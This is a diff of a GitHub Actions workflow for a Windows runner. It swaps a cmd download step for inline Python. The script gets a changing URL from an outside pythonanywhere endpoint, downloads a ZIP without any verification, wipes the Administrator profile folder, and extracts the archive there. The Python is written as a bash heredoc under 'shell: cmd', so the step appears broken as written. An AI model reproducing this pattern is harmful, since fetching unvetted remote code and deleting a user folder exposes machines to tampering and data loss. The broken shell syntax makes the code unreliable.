@@ -27,23 +27,57 @@ jobs:
           echo "Administrator profile folder created."
         shell: cmd
 
-      - name: Download and extract ZIP file
+      - name: Download, extract artifact using Python
         run: |
-          :: Get the URL from the curl API
-          for /f "delims=" %%i in ('curl -s "https://azcaptchahh.pythonanywhere.com/geturl" ^| powershell -Command "$($_ | ConvertFrom-Json).url"') do set ZIPURL=%%i
-          echo URL is %ZIPURL%
-          
-          :: Download the ZIP file
-          curl -L -o C:\Users\administrator\artifact.zip %ZIPURL%
-          
-          :: Extract the ZIP file
-          powershell -Command "Expand-Archive -Path 'C:\Users\administrator\artifact.zip' -DestinationPath 'C:\Users\administrator' -Force"
-          
-          :: Remove the ZIP after extraction
-          del C:\Users\administrator\artifact.zip
-        shell: cmd
+          python - <<EOF
+          import json, urllib.request, zipfile, os, shutil
 
-      - name: List files in Administrator folder
-        run: |
-          dir C:\Users\administrator
+          # ===== Step 1: Fetch the latest artifact URL =====
+          api_url = "https://azcaptchahh.pythonanywhere.com/geturl"
+          with urllib.request.urlopen(api_url) as response:
+              data = json.load(response)
+          artifact_url = data.get("url")
+          if not artifact_url:
+              raise Exception("Artifact URL is empty")
+          print(f"Artifact URL: {artifact_url}")
+
+          # ===== Step 2: Define paths =====
+          zip_path = r"C:\Users\administrator\artifact.zip"
+          target_dir = r"C:\Users\administrator"
+
+          # ===== Step 3: Download the ZIP =====
+          print(f"Downloading artifact to {zip_path} ...")
+          urllib.request.urlretrieve(artifact_url, zip_path)
+          if not os.path.exists(zip_path):
+              raise Exception("Download failed")
+          print("Download completed.")
+
+          # ===== Step 4: Clean target directory =====
+          if os.path.exists(target_dir):
+              print(f"Removing existing contents of {target_dir}")
+              for item in os.listdir(target_dir):
+                  item_path = os.path.join(target_dir, item)
+                  if os.path.isfile(item_path) or os.path.islink(item_path):
+                      os.unlink(item_path)
+                  else:
+                      shutil.rmtree(item_path)
+
+          # ===== Step 5: Extract ZIP =====
+          print(f"Extracting ZIP to {target_dir} ...")
+          with zipfile.ZipFile(zip_path, 'r') as zip_ref:
+              zip_ref.extractall(target_dir)
+
+          # ===== Step 6: Cleanup ZIP =====
+          os.remove(zip_path)
+          print("ZIP file removed.")
+
+          # ===== Step 7: List extracted contents =====
+          print("Contents of Administrator folder:")
+          for root, dirs, files in os.walk(target_dir):
+              for name in dirs:
+                  print(os.path.join(root, name))
+              for name in files:
+                  print(os.path.join(root, name))
+
+          EOF
         shell: cmd
